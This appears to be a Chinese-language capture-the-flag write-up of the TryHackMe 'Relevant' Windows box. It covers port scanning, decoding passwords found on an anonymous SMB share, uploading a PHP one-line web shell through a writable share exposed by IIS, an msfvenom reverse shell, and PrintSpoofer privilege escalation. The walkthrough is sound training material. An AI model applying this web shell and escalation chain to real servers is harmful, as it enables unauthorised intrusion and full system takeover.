---
title: THM Relevant
published: 2025-09-03
tags: [THM,Windows]
category: PenTest
draft: false
image: 'image.png'
---

## Recon
```bash=
┌──(kali😺kali)-[~]
└─$ rustscan -a 10.201.28.141 -r 1-65535 --ulimit 5000 -- -sC -sV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.201.28.141:80
Open 10.201.28.141:135
Open 10.201.28.141:139
Open 10.201.28.141:445
Open 10.201.28.141:3389
Open 10.201.28.141:49663
Open 10.201.28.141:49667
Open 10.201.28.141:49666
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -Pn" on ip 10.201.28.141
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 04:24 EDT
Happy 28th Birthday to Nmap, may it live to be 128!
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:24
Completed NSE at 04:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:24
Completed NSE at 04:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:24
Completed NSE at 04:24, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 04:24
Completed Parallel DNS resolution of 1 host. at 04:24, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 04:24
Scanning 10.201.28.141 [8 ports]
Discovered open port 80/tcp on 10.201.28.141
Discovered open port 49666/tcp on 10.201.28.141
Discovered open port 3389/tcp on 10.201.28.141
Discovered open port 135/tcp on 10.201.28.141
Discovered open port 445/tcp on 10.201.28.141
Discovered open port 49663/tcp on 10.201.28.141
Discovered open port 49667/tcp on 10.201.28.141
Discovered open port 139/tcp on 10.201.28.141
Completed SYN Stealth Scan at 04:24, 0.39s elapsed (8 total ports)
Initiating Service scan at 04:24
Scanning 8 services on 10.201.28.141
Completed Service scan at 04:25, 59.58s elapsed (8 services on 1 host)
NSE: Script scanning 10.201.28.141.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:25
NSE Timing: About 99.91% done; ETC: 04:26 (0:00:00 remaining)
Completed NSE at 04:26, 40.93s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:26
Completed NSE at 04:26, 1.58s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:26
Completed NSE at 04:26, 0.00s elapsed
Nmap scan report for 10.201.28.141
Host is up, received user-set (0.35s latency).
Scanned at 2025-09-01 04:24:55 EDT for 103s

PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 124 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 124 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 124 Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server syn-ack ttl 124 Microsoft Terminal Services
|_ssl-date: 2025-09-01T08:26:36+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-31T08:21:54
| Not valid after:  2026-03-02T08:21:54
| MD5:   d1b2:9b41:e4c2:c373:1651:2b4c:31ac:479d
| SHA-1: cde0:e257:bc72:29b0:1e98:677f:0fd4:5336:760b:3aab
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQeC9Ld0qQ5blHvhLZfkF49TANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yNTA4MzEwODIxNTRaFw0yNjAzMDIwODIx
| NTRaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEApWfXGRiFaJAknxMclFRJIRRCCOa+OPkE07mDumLtclGwUt95qn/Z
| 3+NYe+VgjhNuNLrl7Q/IGNPq4DFOB26tBS7Q0aPcgLsB3pqp5EX5N5jLbSbUXtRj
| 9nBPEgRJijJ66OfNQeJpJvuueSpeiNNlzKwYjxLr41SvTtW3+dZojPzPbMSkFmth
| 8VoUIAukLSES4GVPhV/vBxZbTt3L4PYvrYqYjcfTVtpthvbkeHJZINH0Rep17x0l
| 1VVtBev0nvabDf110iZ81E42A1rWkjb/ArZ7+oBQsXBT6GsWWoahO/27BnEqVHz0
| 1HT6shZyaEbIctyyHSxgU3NvueZZ6LSwiwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAKPzjiC5Nu2n
| Mu2ZWIhLvKCoOwD2ui+zhIiFzM6Jt8JL1FP9+7RcSnTY2QXxE5XGjjYnFiDH8C/0
| wHmDRMCLOeT2NXdJnHxE8nQLNGjx2pzaIeZ0vvgCCQx1UMNUfAm5IjVezz7rVBi9
| VSQcoPpRO7G80t0zN1bOtfYW2OWFTGYW5st672xqadX64mPPNTo0fEfilTt94EHs
| hTVptH9ZpbX6eOuv6d6SKUqDpczL/0tMCnmZfJ6BkiU9u5y+KIfpReG8I/mqvomC
| QlYGtHlfSQhh9Gre0eW5EjvFmV0Dqau+San2KTX3XkmP3gjDkhfiHHyCJyEbdZBy
| i+llffIgCpU=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2025-09-01T08:25:56+00:00
49663/tcp open  http          syn-ack ttl 124 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
49666/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 124 Microsoft Windows RPC
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-09-01T01:26:00-07:00
| smb2-time: 
|   date: 2025-09-01T08:25:57
|_  start_date: 2025-09-01T08:21:54
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 3602/tcp): CLEAN (Timeout)
|   Check 2 (port 13469/tcp): CLEAN (Timeout)
|   Check 3 (port 60407/udp): CLEAN (Timeout)
|   Check 4 (port 22839/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:26
Completed NSE at 04:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:26
Completed NSE at 04:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:26
Completed NSE at 04:26, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.35 seconds
           Raw packets sent: 8 (352B) | Rcvd: 8 (352B)

```

## Exploit


port 445 有開，所以用 smbclient 簡單看一下

```bash=
┌──(kali😺kali)-[~]
└─$ smbclient -L //10.201.28.141/nt4wrksv
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
^[[A^[[D^[[Ddo_connect: Connection to 10.201.28.141 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

找到一個 `passwords.txt`

```bash=
┌──(kali😺kali)-[~]
└─$ smbclient  //10.201.28.141/nt4wrksv 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

		7735807 blocks of size 4096. 4950521 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> 
```

看看它內部長怎樣

```bash=
┌──(kali😺kali)-[~]
└─$ cat passwords.txt                                       
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                    
```

拿到兩組密碼

```bash=
┌──(kali😺kali)-[~]
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123                                                                                                                       
┌──(kali😺kali)-[~]
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$  
```

之後跑去看網頁 - port 80
![Screenshot 2025-09-01 at 4.32.50 PM](https://hackmd.io/_uploads/ByHS50G5gx.png)

用 gobuster 爆路徑

```bash=
┌──(kali😺kali)-[~]
└─$ dirsearch -u 'http://10.201.28.141:80'                                              
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_10.201.28.141_80/_25-09-01_04-35-55.txt

Target: http://10.201.28.141/

[04:35:55] Starting: 
[04:36:01] 403 -  312B  - /%2e%2e//google.com                               
[04:36:02] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[04:36:02] 404 -    2KB - /.ashx                                            
[04:36:02] 404 -    2KB - /.asmx                                            
[04:36:26] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[04:36:35] 404 -    2KB - /admin%20/                                        
[04:36:36] 404 -    2KB - /admin.                                           
[04:37:02] 404 -    2KB - /asset..                                          
[04:37:11] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[04:37:26] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
[04:37:45] 404 -    2KB - /index.php.                                       
[04:37:47] 404 -    2KB - /javax.faces.resource.../                         
[04:37:48] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
[04:37:48] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
[04:37:48] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
[04:37:48] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
[04:37:48] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
[04:37:48] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
[04:37:48] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
[04:37:48] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc
[04:37:48] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage    
[04:37:48] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true 
[04:37:48] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
[04:37:48] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*
[04:37:54] 404 -    2KB - /login.wdm%2e                                     
[04:38:20] 404 -    2KB - /rating_over.                                     
[04:38:27] 404 -    2KB - /service.asmx                                     
[04:38:34] 404 -    2KB - /static..                                         
[04:38:42] 403 -    2KB - /Trace.axd                                        
[04:38:43] 404 -    2KB - /umbraco/webservices/codeEditorSave.asmx          
[04:38:48] 404 -    2KB - /WEB-INF./                                        
[04:38:52] 404 -    2KB - /WebResource.axd?d=LER8t9aS 
```

並且也嘗試用之前所得到的帳號去 port 3389 嘗試做 rdp 登入

```bash=
┌──(kali😺kali)-[~/Desktop]
└─$ xfreerdp3 /u:'Bob' /p:'!P$W0rD!123' /cert:ignore /v:10.201.28.141:3389
[04:42:23:779] [26234:0000667b] [WARN][com.freerdp.client.xfreerdp.utils] - [run_action_script]: [ActionScript] no such script '/home/kali/.config/freerdp/action.sh'
[04:42:23:779] [26234:0000667b] [WARN][com.freerdp.client.xfreerdp.utils] - [run_action_script]: [ActionScript] no such script '/home/kali/.config/freerdp/action.sh'
[04:42:26:873] [26234:0000667b] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5_parse_name (Configuration file does not specify default realm [-1765328160])
[04:42:26:873] [26234:0000667b] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5_parse_name (Configuration file does not specify default realm [-1765328160])
[04:42:26:553] [26234:0000667b] [ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_LOGON_FAILURE [0x00020014]
[04:42:26:553] [26234:0000667b] [ERROR][com.freerdp.core.rdp] - [rdp_recv_callback_int][0x55e3510bb560]: CONNECTION_STATE_NLA - nla_recv_pdu() fail
[04:42:26:553] [26234:0000667b] [ERROR][com.freerdp.core.rdp] - [rdp_recv_callback_int][0x55e3510bb560]: CONNECTION_STATE_NLA status STATE_RUN_FAILED [-1]
[04:42:26:553] [26234:0000667b] [ERROR][com.freerdp.core.transport] - [transport_check_fds]: transport_check_fds: transport->ReceiveCallback() - STATE_RUN_FAILED [-1]
                                                                                                                                           
┌──(kali😺kali)-[~/Desktop]
└─$ xfreerdp3 /u:'Bill' /p:'Juw4nnaM4n420696969!$$$              
' /cert:ignore /v:10.201.28.141:3389
[04:42:47:423] [26468:00006765] [WARN][com.freerdp.client.xfreerdp.utils] - [run_action_script]: [ActionScript] no such script '/home/kali/.config/freerdp/action.sh'
[04:42:47:423] [26468:00006765] [WARN][com.freerdp.client.xfreerdp.utils] - [run_action_script]: [ActionScript] no such script '/home/kali/.config/freerdp/action.sh'
[04:42:49:854] [26468:00006765] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5_parse_name (Configuration file does not specify default realm [-1765328160])
[04:42:49:854] [26468:00006765] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5_parse_name (Configuration file does not specify default realm [-1765328160])
[04:42:49:560] [26468:00006765] [ERROR][com.freerdp.core] - [transport_ssl_cb]: ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED [0x0002000F]
[04:42:49:560] [26468:00006765] [ERROR][com.freerdp.core.transport] - [transport_read_layer]: BIO_read returned an error: error:0A000438:SSL routines::tlsv1 alert internal error
```

這邊沒有想法跑去看 writes up 發現了一件很有趣的事情，我們可以嘗試在剛剛 `smblient` 的畫面裡面做寫檔

在 local 端先將文字弄好

```bash=
┌──(kali😺kali)-[~]
└─$ cat test.txt
dkri3c1
```

之後嘗試在 smbclient 那邊用 put 上傳

```bash=

┌──(kali😺kali)-[~]
└─$ smbclient  //10.201.28.141/nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Mon Sep  1 04:50:15 2025
  ..                                  D        0  Mon Sep  1 04:50:15 2025
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  test.txt                            A        8  Mon Sep  1 04:50:15 2025
  
		7735807 blocks of size 4096. 5137145 blocks available
```

發現是可以讀到檔案的，發現 port `49663` 有開一個一樣功能的 service，簡單來說就是 webDAC https://learn.microsoft.com/zh-tw/iis/install/installing-publishing-technologies/installing-and-configuring-webdav-on-iis

利用它去做讀檔

![Screenshot 2025-09-01 at 4.59.06 PM](https://hackmd.io/_uploads/BkUvlJ79gx.png)

嘗試塞一個 php 的一句話木馬上去

```bash=
┌──(kali😺kali)-[~/Desktop]
└─$ cat exp.php 
<?php system($_GET['cmd'])?>
                                                                                                                       
┌──(kali😺kali)-[~/Desktop]
└─$ smbclient  //10.201.28.141/nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put exp.php
putting file exp.php as \exp.php (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Mon Sep  1 05:01:17 2025
  ..                                  D        0  Mon Sep  1 05:01:17 2025
  exp.php                             A       29  Mon Sep  1 05:01:17 2025
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  test.txt                            A        8  Mon Sep  1 04:50:15 2025

		7735807 blocks of size 4096. 5137110 blocks available
smb: \> 
```
上傳後去網頁上執行的時候發現失敗
![Screenshot 2025-09-01 at 5.02.54 PM](https://hackmd.io/_uploads/BJ2r-JXcxx.png)

這邊猜測說是因為 Windows IIS 不會對 php 做解析，所以改用 aspx ，利用 msfvenom 做 payload，然後也踩了一個雷，就是
```windows/shell/reverse_tcp``` 沒反應改用 ```windows/x64/shell_reverse_tcp``` 就好了

最後在 `C:\Users\Bob\Desktop` 找到 user Flag

> THM{fdk4ka34vk346ksxfr21tg789ktf45}

![Screenshot 2025-09-01 at 5.32.15 PM](https://hackmd.io/_uploads/By3Q_km5xe.png)

之後就是要如何提權，先把 winPeas 丟上去

先 `whoami /priv` 看一下


```pwsh=
PS C:\Users\Bob> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

發現說 `SeImpersonatePrivilege` 是 Enabled ，所以可以試試看用 juicy potato 做提權，然後有趣的來了，我發現我在用 juicy potato 的時候他會把他自動砍掉 WTF ...

用 systeminfo 看一下發現他的版本是 `Windows Server 2016`


![image](https://hackmd.io/_uploads/SJQJbCHcex.png)


可以參考 https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all


之後用 https://github.com/k4sth4/PrintSpoofer 成功拿到 root

![Screenshot 2025-09-01 at 6.17.48 PM](https://hackmd.io/_uploads/HJu0fgX9ll.png)

在 `C:\Users\Administrator\Desktop` 找到 flag

> THM{1fk5kf469devly1gl320zafgl345pv}

## 小小反思

最後做一個之前不會做的小小總結，要取得 initial access 的時候因為不知道有 webdac 這個東西所以吃了虧，然後還有 samba 可以用來上傳檔案的佈ㄨ，最後提權的部分發現自己在 potato 系列的提權還很不熟悉，其實看到這題的版本就知道應該要用 Rogue-Potato 而不是 Juicy patato ，感覺自己要在多課一點 potato 系列的文章，然後還有不要忘記截圖關鍵部分 xDD 


## Pwned!!

![Screenshot 2025-09-01 at 6.19.10 PM](https://hackmd.io/_uploads/ryJ47gQ9lx.png)